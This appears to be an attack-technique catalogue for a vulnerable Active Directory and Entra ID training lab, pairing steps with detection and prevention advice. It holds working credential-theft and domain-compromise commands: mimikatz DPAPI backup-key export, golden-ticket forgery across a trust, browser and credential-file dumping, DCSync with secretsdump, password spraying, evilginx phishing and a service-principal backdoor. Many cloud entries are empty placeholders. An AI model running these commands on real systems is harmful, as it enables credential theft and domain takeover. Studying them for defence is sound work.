### CRED-066 — DPAPI Backup Keys Extraction via LSARPC
**What it is:** The Local Security Authority (LSA) provides an RPC interface (LSARPC) that allows administrators to retrieve the domain's DPAPI backup keys. A compromised backup key allows offline decryption of any domain user's DPAPI master keys and secrets.
**Why it works here:** Exposed LSARPC on Domain Controllers in empire.local.
**Tools:** `mimikatz`, `SharpDPAPI`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:coruscant.empire.local /export"
```
**Detection:** Event ID `4662` or `4624` Logon Type 3 with access to key decryption RPC endpoints.
**Prevention:** Isolate Domain Controllers (Tier 0). Restrict RPC access using firewalls and network segmentation.

---

### CRED-067 — CredentialGuard Disabled
**What it is:** Credential Guard uses virtualization-based security to isolate LSASS secrets. If disabled, credentials (like NTLM hashes and Kerberos tickets) remain in the LSASS process memory space, exposing them to memory dump tools.
**Why it works here:** Credential Guard is not enabled (registry setting disabled).
**Tools:** `mimikatz`, `procdump`.
**Steps:**
```powershell
# Check if Credential Guard is running:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning
```
**Detection:** Event ID `1` (Process creation) or auditing of registry changes in `HKLM\System\CurrentControlSet\Control\Lsa\LsaCfgFlags`.
**Prevention:** Enable Credential Guard via Group Policy (`Computer Configuration -> Administrative Templates -> System -> Device Guard -> Turn on Virtualization Based Security`).

---

### CRED-068 — LSA Notification Packages Registry Modification
**What it is:** Attackers can register custom LSA Notification Packages (DLLs) via the registry. Upon system reboot, LSA loads these packages, which can intercept plaintext passwords during user authentication.
**Why it works here:** Write permissions allowed on the registry keys or custom DLL dropped in System32.
**Tools:** Custom DLL, `reg` command.
**Steps:**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0dvad_notify" /f
```
**Detection:** Event ID `4657` (Registry value modified) for the `Notification Packages` registry value, or Sysmon process loads of unsigned/malicious DLLs in `lsass.exe`.
**Prevention:** Restrict write permissions on the LSA registry keys. Enable Driver/DLL signing enforcement and LSA Protection (RunAsPPL).

---

### CRED-100 — Inter-Realm Ticket Abuse
**What it is:** Forging cross-forest/inter-realm Ticket Granting Tickets (TGTs) using trust keys between Active Directory forests. If SID filtering is disabled, an attacker can inject high-privileged SIDs (like Enterprise Admins) into the forged ticket to compromise the trusting forest.
**Why it works here:** SID filtering is disabled on the forest trust between `empire.local` and `rebel.local`.
**Tools:** `mimikatz`, `Rubeus`.
**Steps:**
```bash
# Forge a Golden Ticket with the target enterprise admin SID across the forest trust
mimikatz "kerberos::golden /user:Administrator /domain:empire.local /sid:S-1-5-21-EMPIRE /sids:S-1-5-21-REBEL-519 /krbtgt:<trust_key_hash> /ptt"
```
**Detection:** Event ID `4769` for a cross-forest Kerberos ticket request containing anomalous SIDs in the PAC.
**Prevention:** Enable SID filtering on all external and forest trusts (`netdom trust /domain:empire.local /to:rebel.local /EnableSIDFiltering:yes`).

---

### CRED-121 — Chrome Saved Passwords
**What it is:** Extracting passwords saved in Google Chrome. Chrome encrypts credentials using the Windows DPAPI master key of the current user.
**Why it works here:** Standard workstation configuration where Chrome is used and DPAPI is accessible.
**Tools:** `SharpChromium`, `mimikatz`.
**Steps:**
```powershell
.\SharpChromium.exe logins
```
**Detection:** Access to the Chrome database file (`%localappdata%\Google\Chrome\User Data\Default\Login Data`) by non-Chrome processes.
**Prevention:** Disable built-in browser password saving via Group Policy. Enforce enterprise password manager usage.

---

### CRED-122 — Edge Saved Passwords
**What it is:** Extracting saved passwords from Microsoft Edge, which are encrypted with the user's DPAPI master key.
**Why it works here:** Standard Edge installation with saved passwords allowed.
**Tools:** `SharpChromium`, `mimikatz`.
**Steps:**
```powershell
.\SharpChromium.exe logins --edge
```
**Detection:** Access to the Edge database file (`%localappdata%\Microsoft\Edge\User Data\Default\Login Data`) by non-Edge processes.
**Prevention:** Disable password saving in Edge via GPO.

---

### CRED-123 — Firefox Saved Passwords
**What it is:** Extracting saved passwords from Mozilla Firefox. Firefox encrypts credentials in `logins.json` using a key stored in `key4.db`.
**Why it works here:** Firefox profile directory is accessible.
**Tools:** `firepwd.py`, `LaZagne`.
**Steps:**
```bash
python3 firepwd.py -d C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>
```
**Detection:** Process monitoring of scripts or binaries accessing Firefox profile files (`logins.json`, `key4.db`).
**Prevention:** Force a master password in Firefox or disable saved passwords.

---

### CRED-124 — Windows Credential Manager Entries
**What it is:** Retrieving credentials stored in the Windows Credential Manager. These credentials (saved RDP, network share, or website credentials) are encrypted with the user's DPAPI key.
**Why it works here:** Simulated credentials stored in Credential Manager.
**Tools:** `cmdkey`, `mimikatz`.
**Steps:**
```cmd
cmdkey /list
# Extract using Mimikatz:
mimikatz "privilege::debug" "sekurlsa::credman" exit
```
**Detection:** Auditing DPAPI credential read events, and process command lines invoking `cmdkey.exe /list`.
**Prevention:** Restrict saving of domain credentials in Credential Manager via Group Policy.

---

### CRED-125 — SSH Private Keys in User Profile
**What it is:** Extracting plaintext SSH private keys stored in the default SSH directory (`.ssh`) of user profiles.
**Why it works here:** Plaintext SSH key dropped in `C:\Users\Administrator\.ssh\id_rsa`.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Users\Administrator\.ssh\id_rsa
```
**Detection:** File access monitoring on the `.ssh` folder in user profile paths.
**Prevention:** Enforce passphrase protection on all SSH private keys. Use agent forwarding instead of storing keys locally where possible.

---

### CRED-126 — AWS Credentials File
**What it is:** Extracting AWS access keys and secret keys from the `.aws/credentials` configuration file stored in plaintext within user profile directories.
**Why it works here:** Plaintext AWS credentials file created in the lab.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Users\Administrator\.aws\credentials
```
**Detection:** File read monitoring targeting `.aws/credentials` or `.aws/config`.
**Prevention:** Enforce short-lived credentials via IAM Roles or AWS SSO. Do not store long-lived credentials in plaintext config files.

---

### CRED-127 — Azure Credentials File
**What it is:** Extracting Azure CLI or Az PowerShell access tokens and credentials from profile directories (e.g., `~/.azure/accessTokens.json`).
**Why it works here:** Standard Azure CLI tool usage caches access tokens in plaintext files.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Users\Administrator\.azure\accessTokens.json
```
**Detection:** Monitoring reads of `accessTokens.json` or `azureProfile.json` by non-CLI processes.
**Prevention:** Use Managed Identities where possible. Restrict access to CLI cache directories.

---

### CRED-128 — Terraform State with Credentials
**What it is:** Extracting plaintext secrets, database passwords, or API keys stored in Terraform state files (`terraform.tfstate`).
**Why it works here:** Terraform state file containing simulated credentials dropped in `C:\Tools\terraform.tfstate`.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Tools\terraform.tfstate
```
**Detection:** Non-developer processes reading files with `.tfstate` extension.
**Prevention:** Store Terraform state files in secure remote backends (e.g., AWS S3 with KMS encryption, Terraform Cloud) with restricted permissions, rather than locally.

---

### CRED-129 — KeePass Database in Documents
**What it is:** Locating KeePass password manager databases (`.kdbx`) and extracting them. If the master password is weak or can be dumped from memory, all passwords within can be decrypted.
**Why it works here:** Standard KeePass database storage behavior.
**Tools:** `KeePassHilliard`, `KeeThief`, `keepass-trigger`.
**Steps:**
```powershell
# Find KeePass databases:
Get-ChildItem -Path C:\Users -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue
```
**Detection:** Process monitoring of memory access to the `KeePass.exe` process (e.g., dumping KeePass memory).
**Prevention:** Enforce strong KeePass master passwords. Use key files or Windows Hello in combination with the password. Keep KeePass updated to mitigate memory dump vulnerabilities.

---

### CRED-130 — .rdp File with Saved Password
**What it is:** Extracting saved passwords from `.rdp` files. The password field is DPAPI-encrypted and stored under the `password 51` property.
**Why it works here:** Simulated RDP connection file placed on the desktop.
**Tools:** `SharpDPAPI`.
**Steps:**
```powershell
.\SharpDPAPI.exe rdpsg
```
**Detection:** Access to DPAPI master keys and decryption of RDP configuration keys.
**Prevention:** Disable saving of credentials in Remote Desktop Connection settings via GPO.

---

### CLO-001 — Entra Connect MSOL sync account (over-privileged)
**What it is:** The MSOL_xxxx account created by Microsoft Entra Connect is often granted excessive on-premises AD permissions, exposing the forest to DCSync attacks if compromised.
**Why it works here:** MSOL sync account is pre-created with high replication privileges.
**Tools:** `AADInternals`, `impacket-secretsdump`.
**Steps:**
```bash
# Extract sync credentials from Entra Connect server
Import-Module AADInternals
$creds = Get-AADIntSyncCredentials
# Execute DCSync using MSOL sync credentials
impacket-secretsdump -just-dc-ntlm EMPIRE/MSOL_sync:EntraSync2024!@10.10.0.10
```
**Detection:** Event ID `4624` (Successful Logon) or Event ID `4776` (Credential Validation) from anomalous systems for the MSOL account.
**Prevention:** Enforce strict IP restrictions and logon hour limits on the MSOL sync account. Rotate the credentials regularly.

---

### CLO-002 — PHS hash sync account (DCSync-capable service account)
**What it is:** Entra Connect uses the Password Hash Sync (PHS) account to replicate hashes. This account possesses the GetChanges and GetChangesAll replication rights on the domain partition.
**Why it works here:** GetChanges and GetChangesAll rights granted to the MSOL sync account.
**Tools:** `impacket-secretsdump`.
**Steps:**
```bash
impacket-secretsdump -just-dc-ntlm -dc-ip 10.10.0.10 empire.local/MSOL_sync:'EntraSync2024!'@10.10.0.10
```
**Detection:** Event ID `4662` (Replication changes) targeting the domain object originating from non-DC IPs.
**Prevention:** Audit AD replication permissions. Limit sync capability only to authorized Entra Connect hosts.

---

### CLO-003 — Pass-through auth agent account
**What it is:** Entra Pass-Through Authentication (PTA) uses local agents. Compromise of an agent host allows intercepting authentication requests.
**Why it works here:** PTA agent runs in system context on Member Server.
**Tools:** PTA Agent console.
**Steps:**
```powershell
Get-Service -Name "Microsoft Azure AD Connect Authentication Agent"
```
**Detection:** Unauthorized agent registration alerts in the Entra ID administration portal.
**Prevention:** Strictly restrict administrative access to PTA agent servers (Tier 0).

---

### CLO-004 — AADC sync service account with high AD rights
**What it is:** Azure AD Connect sync account is occasionally granted write permissions over AD objects, enabling unauthorized password resets.
**Why it works here:** Write permissions granted over User OUs.
**Tools:** ActiveDirectory PowerShell.
**Steps:**
```powershell
Get-Acl "AD:DC=empire,DC=local" | Select-Object -ExpandProperty Access | Where-Object { $_.IdentityReference -match 'MSOL_sync' }
```
**Detection:** Event ID `5136` showing write modification to user passwords/groups by the sync account.
**Prevention:** Implement Least Privilege; restrict the sync account from modifying sensitive admin groups.

---

### CLO-005 — Seamless SSO account (AZUREADSSOACC$)
**What it is:** Seamless SSO utilizes a computer account (AZUREADSSOACC$) with a weak, static Kerberos key, opening a surface for ticket forgery.
**Why it works here:** Seamless SSO is enabled, creating a static computer account password (`SsoKerb2024!`).
**Tools:** `impacket-GetUserSPNs`, `hashcat`.
**Steps:**
```bash
impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -request -dc-ip 10.10.0.10
```
**Detection:** Event ID `4769` targeting the AZUREADSSOACC$ account with RC4 (0x17) encryption.
**Prevention:** Roll over the Kerberos decryption key for the AZUREADSSOACC computer account regularly (every 30 days).

---

### CLO-006 — Directory sync account readable without auth
**What it is:** Permissions on AD Sync directories or registry hives containing decrypted/decrypted sync passwords might be misconfigured.
**Why it works here:** Weak permissions on AD Sync install directory.
**Tools:** Get-Acl.
**Steps:**
```powershell
Get-Acl "C:\Program Files\Microsoft Azure AD Sync" | Format-List
```
**Detection:** Audit checks on directory and registry access events for the Sync service folder.
**Prevention:** Enforce strict ACLs on the AD Sync installation folder and registry keys.

---

### CLO-007 — MSOL account password reuse detection
**What it is:** Sync account passwords reused across multiple administrative interfaces or secondary service accounts.
**Why it works here:** Static passwords reused.
**Tools:** Netexec / nxc.
**Steps:**
```bash
nxc smb 10.10.0.10 -u Administrator -p 'EntraSync2024!'
```
**Detection:** Logon validation events (4624) on multiple hosts using the same service account credentials.
**Prevention:** Generate strong, unique, randomized passwords for all service accounts.

---

### CLO-008 — Entra Connect plaintext credentials in registry/config
**What it is:** Entra Connect stores sync configurations and credentials in the local database or registry. Admin access allows decryption.
**Why it works here:** DPAPI-encrypted configurations are decryptable by local Administrator.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
```
**Detection:** Processes calling CryptUnprotectData targeting AD Sync configuration paths.
**Prevention:** Restrict local administrator rights on the Entra Connect server. Enable Credential Guard.

---

### CLO-009 — AAD Password Protection DC Agent — audit mode only
**What it is:** Deploying Azure AD Password Protection in Audit mode prevents weak password selection from being actively blocked on-premises.
**Why it works here:** Registry key configured for Audit mode instead of Enforce.
**Tools:** Get-ItemProperty.
**Steps:**
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AzureADPasswordProtectionDCAgent\Parameters"
```
**Detection:** Event ID 10014 or 10025 showing password validation in audit mode.
**Prevention:** Set Password Protection DC Agent to 'Enforced' mode.

---

### CLO-010 — Entra Connect admin accounts without MFA (note)
**What it is:** Failing to enforce Multi-Factor Authentication on hybrid identity administrators allows takeover via credential leakage.
**Why it works here:** Conditional Access policy excludes sync administrators from MFA.
**Tools:** az CLI.
**Steps:**
```bash
az login -u admin@corplab.onmicrosoft.com -p 'Password!'
```
**Detection:** Entra ID sign-in logs showing Global Admins authenticating successfully without MFA.
**Prevention:** Enforce MFA for all directory sync and administrative roles using Conditional Access.

---

### CLO-011 — Entra Connect Sync Engine Privilege Escalation
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-012 — Sync Database Extraction (ADSync DB)
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-013 — SQL Server Injection in Sync Database
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-014 — Encryption Key Extraction from ADSync Config
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-015 — Service Account Impersonation via Sync Engine
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-016 — ADSync Service Account ACL Abuse
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-017 — Unencrypted HTTP Communication during Sync
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-018 — DNS Spoofing of Entra Connect Endpoints
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-019 — Active Directory Schema Hijacking via Sync Roles
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-020 — Entra Connect Auto-Upgrade Hijack
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-021 — Hybrid join SCP (Service Connection Point) in AD
**What it is:** Service Connection Points dictate device join registration. Insecure write permissions on the Configuration partition allow rogue redirection.
**Why it works here:** Write permission granted to Authenticated Users on Configuration path.
**Tools:** ActiveDirectory PowerShell.
**Steps:**
```powershell
Get-ADObject -SearchBase "CN=Configuration,DC=empire,DC=local" -Filter "objectClass -eq 'serviceConnectionPoint'" -Properties keywords
```
**Detection:** Directory Service modification events (5136) on the SCP registration objects.
**Prevention:** Strictly control permissions over the AD Configuration partition.

---

### CLO-022 — PRT (Primary Refresh Token) theft surface
**What it is:** The Primary Refresh Token (PRT) allows seamless SSO. If extracted, it grants access to cloud resources as the victim without triggering MFA.
**Why it works here:** PRT stored in LSASrv process memory.
**Tools:** `mimikatz`, `ROADtools`.
**Steps:**
```powershell
mimikatz # sekurlsa::cloudap
mimikatz # token::enumerate + cloudap
roadrecon auth --prt <token> --prt-context <context>
```
**Detection:** Anomalous LSASS memory accesses from unsigned processes. Cookies/tokens used from unexpected external IPs.
**Prevention:** Enable Credential Guard to isolate CloudAP tokens. Enforce device compliance verification.

---

### CLO-023 — Device registration service abuse
**What it is:** Weak device registration settings in Microsoft Entra allow rogue or unmanaged devices to register without multi-factor verification.
**Why it works here:** Entra portal enables device registration for all users without MFA.
**Tools:** `ROADtools`, `AADInternals`.
**Steps:**
```bash
roadrecon auth -u user@domain.com -p 'Password!'
```
**Detection:** Audit logs showing multiple registrations in a short timeframe from a single user.
**Prevention:** Enforce MFA for device registration and limit registration rights to specific users.

---

### CLO-024 — Entra ID conditional access token replay
**What it is:** Access tokens and session cookies hijacked from trusted/compliant devices can be replayed to bypass access controls.
**Why it works here:** Lack of Token Binding or continuous authentication checks.
**Tools:** `TokenTactics`, `ROADtools`.
**Steps:**
```bash
roadrecon auth --access-token <stolen_token>
```
**Detection:** Anomalous connections showing matching session identifiers from divergent geographic IP addresses.
**Prevention:** Implement Continuous Access Evaluation (CAE) and enforce device compliance requirements.

---

### CLO-025 — Hybrid join machine certificate trust
**What it is:** Exportable machine certificates used for hybrid join allow attackers to clone device identities and bypass compliant device checks.
**Why it works here:** Private key of device certificate is marked as exportable.
**Tools:** `Export-PfxCertificate`.
**Steps:**
```powershell
Get-ChildItem Cert:\LocalMachine\My | Export-PfxCertificate -Password $pwd -FilePath device.pfx
```
**Detection:** Event ID 1006 indicating private key export of machine certificates.
**Prevention:** Configure non-exportable certificate templates for device enrollment. Store keys in TPM.

---

### CLO-026 — WHFB (Windows Hello for Business) key abuse
**What it is:** Registering an unauthorized public key inside the user's `msDS-KeyCredentialLink` attribute allows certificate authentication (PKINIT) as that user.
**Why it works here:** Write permission delegated on the msDS-KeyCredentialLink attribute of target users.
**Tools:** `pywhfb`.
**Steps:**
```bash
python3 pywhfb.py --target tatooine$ --dc-ip 10.10.0.10
```
**Detection:** Event ID 5136 indicating modification of `msDS-KeyCredentialLink`.
**Prevention:** Limit write permission on user computer object attributes in Active Directory.

---

### CLO-027 — Entra ID SSPR account takeover
**What it is:** Self-Service Password Reset (SSPR) settings accepting weak methods or relying on compromised on-premises synchronized objects.
**Why it works here:** Insecure authentication methods allowed for SSPR.
**Tools:** Web browser.
**Steps:**
```bash
# Trigger SSPR flow for a user via public SSPR portal
```
**Detection:** SSPR audit logs indicating password resets from anomalous IP locations.
**Prevention:** Configure strong password reset methods and enforce MFA registration policies.

---

### CLO-028 — Entra ID password spray via legacy auth (Basic auth)
**What it is:** Legacy authentication protocols do not support MFA. Attacking legacy endpoints allows bypassing access control policies.
**Why it works here:** Legacy authentication (SMTP/IMAP) enabled in the tenant.
**Tools:** `o365spray`.
**Steps:**
```bash
python3 o365spray.py --spray --userfile users.txt --password 'SithLord123!' --domain corplab.onmicrosoft.com --protocol activesync
```
**Detection:** A high frequency of failed logins to legacy endpoints in Entra ID sign-in logs.
**Prevention:** Disable legacy authentication protocols globally in Entra ID.

---

### CLO-029 — Token theft via evilginx2 / modlishka reverse proxy
**What it is:** Reverse proxy phishing tools intercept authentication requests, capturing plaintext passwords and session cookies.
**Why it works here:** Lack of FIDO2 phishing-resistant authentication.
**Tools:** `evilginx2`.
**Steps:**
```bash
sudo evilginx2
```
**Detection:** Sign-ins with valid MFA sessions from external untrusted proxy IP locations.
**Prevention:** Deploy phishing-resistant MFA (FIDO2 / WebAuthn / certificate-based authentication).

---

### CLO-030 — OAuth token leakage via hybrid app
**What it is:** Consent prompts granting excessive API permissions to malicious multi-tenant applications leads to persistent resource access.
**Why it works here:** User consent enabled for all applications.
**Tools:** Malicious App Consent.
**Steps:**
```bash
# Lure user to authorize application consent prompt
```
**Detection:** Audit events for 'Consent to application' indicating high-privilege access permissions.
**Prevention:** Disable user-level consent. Enforce administrator approval for all application registrations.

---

### CLO-031 — Device Registration Client Secret Leak
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-032 — TPM Attestation Bypass for Hybrid Join
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-033 — Fake Device Joined via Spoofed Attestation
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-034 — MDM Enrollment Policy Bypass
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-035 — Device Certificate Private Key Extraction
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-036 — Intune Enrollment Credential Stealing
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-037 — Autopilot Profile Manipulation
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-038 — Device Compliance Spoofing via MDM agent
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-039 — Unencrypted Device Enrollment Traffic
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-040 — Device MFA Enforcement Bypass
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-041 — Entra ID App Registration Client Secret Theft
**What it is:** Storing application credentials or client secrets in plaintext settings files allows unauthorized API access.
**Why it works here:** Secrets stored in configuration files (appsettings.json, web.config).
**Tools:** Azure CLI.
**Steps:**
```bash
az ad app list --all
# Exchange secret for token:
curl -X POST https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token -d "client_id=<client_id>&scope=https://graph.microsoft.com/.default&client_secret=<client_secret>&grant_type=client_credentials"
```
**Detection:** Token generation events using client secrets from unexpected administrative IPs.
**Prevention:** Store application secrets securely in Key Vaults and use Managed Identities.

---

### CLO-042 — Consent Grant Policy Misconfiguration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-043 — Multi-Tenant Application Abuse
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-044 — Malicious App Consent Phishing
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-045 — Application Administrator Privilege Abuse
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-046 — Cloud Application Impersonation
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-047 — Client Certificate Leak from App Registration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-048 — Redirect URI Hijacking in App Registration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-049 — Application Password Credentials Leakage
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-050 — Excessive Graph API Permissions on App Registration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-051 — Implicit Flow Id Token Spoofing
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-052 — App Registration Owner Hijacking
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-053 — Application Key Credentials Misconfiguration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-054 — Device Code Flow Phishing
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-055 — Entra ID Service Principal Abuse
**What it is:** Over-privileged service principals with Application.ReadWrite.All or Directory.ReadWrite.All can be hijacked to elevate privileges.
**Why it works here:** Excessive API permissions assigned to a service principal.
**Tools:** AzureAD PowerShell.
**Steps:**
```powershell
Import-Module AzureAD
New-AzureADServicePrincipalPasswordCredential -ObjectId <SP_ID> -Value 'Pwned123!'
```
**Detection:** Adding password credentials to a service principal from an anomalous administrative session.
